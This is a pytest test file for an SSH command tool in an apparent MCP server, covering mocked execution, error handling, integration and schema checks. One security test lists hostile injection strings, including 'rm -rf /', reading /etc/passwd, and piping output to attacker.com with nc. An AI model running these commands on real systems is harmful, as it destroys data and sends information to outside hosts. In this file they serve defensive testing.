"""Tests for SSH tool functionality."""

import pytest
from unittest.mock import MagicMock, patch, AsyncMock
import asyncio


class TestSSHToolUnit:
    """Unit tests for SSH tool (mocked)."""
    
    def test_ssh_execute_success(self, mock_ssh_manager):
        """Test successful SSH command execution."""
        result = mock_ssh_manager.execute_command(
            host='test-server',
            command='echo "hello world"'
        )
        
        assert result['exit_code'] == 0
        assert 'hello' in result['stdout'].lower()
        assert result['stderr'] == ''
    
    def test_ssh_execute_with_error(self, mock_ssh_manager):
        """Test SSH command that returns non-zero exit code."""
        mock_ssh_manager.execute_command.return_value = {
            'stdout': '',
            'stderr': 'command not found',
            'exit_code': 127
        }
        
        result = mock_ssh_manager.execute_command(
            host='test-server',
            command='nonexistent-command'
        )
        
        assert result['exit_code'] != 0
        assert 'command not found' in result['stderr']
    
    def test_ssh_connection_failure(self, mock_ssh_manager):
        """Test SSH connection failure handling."""
        mock_ssh_manager.execute_command.side_effect = ConnectionError(
            "Could not connect to host"
        )
        
        with pytest.raises(ConnectionError, match="Could not connect"):
            mock_ssh_manager.execute_command(
                host='unreachable-server',
                command='uname'
            )
    
    def test_ssh_authentication_failure(self, mock_ssh_manager):
        """Test SSH authentication failure."""
        mock_ssh_manager.execute_command.side_effect = PermissionError(
            "Authentication failed"
        )
        
        with pytest.raises(PermissionError, match="Authentication"):
            mock_ssh_manager.execute_command(
                host='test-server',
                command='whoami'
            )
    
    def test_ssh_command_timeout(self, mock_ssh_manager):
        """Test SSH command timeout handling."""
        mock_ssh_manager.execute_command.side_effect = TimeoutError(
            "Command timed out after 30s"
        )
        
        with pytest.raises(TimeoutError, match="timed out"):
            mock_ssh_manager.execute_command(
                host='test-server',
                command='sleep 60',
                timeout=30
            )
    
    def test_ssh_with_special_characters(self, mock_ssh_manager):
        """Test SSH command with special characters."""
        # Test that special chars are properly handled
        special_command = 'echo "test & echo dangerous" | grep test'
        
        mock_ssh_manager.execute_command.return_value = {
            'stdout': 'test & echo dangerous',
            'stderr': '',
            'exit_code': 0
        }
        
        result = mock_ssh_manager.execute_command(
            host='test-server',
            command=special_command
        )
        
        assert result['exit_code'] == 0
        # Ensure the command was not interpreted dangerously
        mock_ssh_manager.execute_command.assert_called_once()


@pytest.mark.integration
@pytest.mark.ssh
class TestSSHToolIntegration:
    """Integration tests for SSH tool (requires SSH server)."""
    
    def test_real_ssh_connection(self, ssh_test_server):
        """Test real SSH connection to test server."""
        from src.mcp.ssh_manager import SSHManager
        
        ssh = SSHManager()
        
        result = ssh.execute_command(
            host=ssh_test_server['host'],
            port=ssh_test_server['port'],
            username=ssh_test_server['username'],
            password=ssh_test_server['password'],
            command='echo "integration test"'
        )
        
        assert result['exit_code'] == 0
        assert 'integration test' in result['stdout']
    
    def test_real_ssh_system_commands(self, ssh_test_server):
        """Test various system commands over SSH."""
        from src.mcp.ssh_manager import SSHManager
        
        ssh = SSHManager()
        
        # Test uname
        result = ssh.execute_command(
            host=ssh_test_server['host'],
            port=ssh_test_server['port'],
            username=ssh_test_server['username'],
            password=ssh_test_server['password'],
            command='uname -a'
        )
        
        assert result['exit_code'] == 0
        assert len(result['stdout']) > 0
        
        # Test pwd
        result = ssh.execute_command(
            host=ssh_test_server['host'],
            port=ssh_test_server['port'],
            username=ssh_test_server['username'],
            password=ssh_test_server['password'],
            command='pwd'
        )
        
        assert result['exit_code'] == 0
        assert '/' in result['stdout']
    
    def test_real_ssh_error_command(self, ssh_test_server):
        """Test command that fails on real SSH."""
        from src.mcp.ssh_manager import SSHManager
        
        ssh = SSHManager()
        
        result = ssh.execute_command(
            host=ssh_test_server['host'],
            port=ssh_test_server['port'],
            username=ssh_test_server['username'],
            password=ssh_test_server['password'],
            command='nonexistent-cmd-12345'
        )
        
        # Should not crash, but return error
        assert result['exit_code'] != 0


class TestSSHSecurityValidation:
    """Security validation tests for SSH tool."""
    
    def test_ssh_command_injection_prevention(self, mock_ssh_manager):
        """Test that command injection is prevented."""
        # Attempt common injection patterns
        dangerous_commands = [
            'ls; rm -rf /',
            'ls && cat /etc/passwd',
            'ls | nc attacker.com 1234',
            'ls $(malicious)',
            'ls `dangerous`'
        ]
        
        for cmd in dangerous_commands:
            # The SSH manager should either sanitize or reject these
            # For now, just verify the mock doesn't execute unexpected things
            mock_ssh_manager.execute_command.return_value = {
                'stdout': '',
                'stderr': 'Command blocked by security policy',
                'exit_code': 1
            }
            
            result = mock_ssh_manager.execute_command(
                host='test-server',
                command=cmd
            )
            
            # Should be blocked or sanitized
            assert result['exit_code'] != 0 or 'blocked' in result['stderr'].lower()
    
    def test_ssh_no_credentials_in_output(self, mock_ssh_manager):
        """Test that credentials are never in output."""
        mock_ssh_manager.execute_command.return_value = {
            'stdout': 'Command executed successfully',
            'stderr': '',
            'exit_code': 0
        }
        
        result = mock_ssh_manager.execute_command(
            host='test-server',
            command='echo test',
            password='secret123'
        )
        
        # Password should not appear in output
        assert 'secret123' not in str(result)
        assert 'secret123' not in result['stdout']
        assert 'secret123' not in result['stderr']


class TestSSHMCPProtocol:
    """Test SSH tool MCP protocol compliance."""
    
    def test_ssh_tool_schema(self):
        """Test that ssh.run tool has proper schema."""
        # This would test the actual MCP tool definition
        from conftest import assert_valid_tool_output
        
        tool_output = {
            'result': {
                'stdout': 'output',
                'stderr': '',
                'exit_code': 0
            }
        }
        
        assert_valid_tool_output(tool_output, 'ssh.run')
    
    def test_ssh_tool_error_format(self):
        """Test that SSH errors follow MCP format."""
        error_response = {
            'error': {
                'code': 'CONNECTION_FAILED',
                'message': 'Could not connect to host test-server',
                'data': {
                    'host': 'test-server',
                    'reason': 'timeout'
                }
            }
        }
        
        from conftest import assert_valid_mcp_response
        assert_valid_mcp_response(error_response)
